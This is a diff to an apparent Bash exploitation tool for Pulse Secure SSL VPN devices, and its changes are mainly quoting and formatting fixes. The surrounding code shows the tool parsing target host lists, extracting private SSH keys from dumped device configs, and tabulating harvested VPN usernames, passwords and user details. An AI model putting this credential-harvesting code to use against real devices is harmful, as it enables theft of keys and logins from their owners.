@@ -4,7 +4,7 @@
 # Based on research by Orange Tsai and Meh Chang:
 # https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html.
 # Thanks also to Alyssa Herrera and 0xDezzy for additional insights.
-# Huge thanks to @bl4ckh0l3z for fixes, cleaning and refactoring the code significantly!
+# Huge thanks to bl4ckh0l3z for fixing, cleaning and refactoring the code significantly!
 #
 
 PROGNAME=${0##*/}
@@ -91,7 +91,7 @@ function check_target {
   else
     target_list=$(echo ${target_list} | egrep -o "(([0-9]{1,3}\.){3}[0-9]{1,3})|(^[-\.a-zA-Z]+[0-9]*[-\.a-zA-Z]*$)")
   fi
-  target_list=$(echo ${target_list} | sed -E 's/\s/\n/g' | sort -u)
+  target_list=$(echo ${target_list} | sed -E "s/\\s/\\n/g" | sort -u)
   if [ "${target_list}" == "" ];then
     echo "  [!] Target empty or unrecognized!"
     exit 1
@@ -105,7 +105,7 @@ function check_target {
       fi
     done
   fi
-  echo "  [+] Targets: #$(echo ${target_list} | sed -E 's/\s/\n/g' | wc -l)"
+  echo "  [+] Targets: #$(echo ${target_list} | sed -E "s/\\s/\\n/g" | wc -l)"
   echo "    [+] Done"
 }
 
@@ -176,7 +176,7 @@ function extract_ssh_keys {
   target=$1
   if [ $is_ssh_keys == true ];then
     echo "  [#] Extracting SSH keys..."
-    ssh_keys=$(strings $DATA_DIR/$target/${target}_config | grep -Ezo "[\-]{5}BEGIN PRIVATE KEY[\-]{5}[^\-]*[\-]{5}END PRIVATE KEY[\-]{5}" | tr -d '\0' | sed -E 's/(-----)(-----)/\1\n\2/g')
+    ssh_keys=$(strings $DATA_DIR/$target/${target}_config | grep -Ezo "[\-]{5}BEGIN PRIVATE KEY[\-]{5}[^\-]*[\-]{5}END PRIVATE KEY[\-]{5}" | tr -d '\0' | sed -E "s/(-----)(-----)/\1\\n\2/g")
     num=$(echo "${ssh_keys}" | egrep -c "[\-]{5}BEGIN PRIVATE KEY[\-]{5}" )
     echo "    [+] SSH keys: #$num"
     if [ $num -gt 0 ];then
@@ -503,7 +503,7 @@ function extract_vpn_logins {
           fi
         fi
       done
-    done | sort -u | sed 's/:/  /g')
+    done | sort -u | sed 's/:/ \& /g' | sed -E 's/^(.*)$/\1 \&  \&  \&  \&  \&  \&  \& \n/g')
 
     data=$(echo -e "${data}" | sort -u)
     data="Username & Password & Name & Email & OperatingSystem & Language & IPAddress & MACAddress & LastLogin\n"${data}
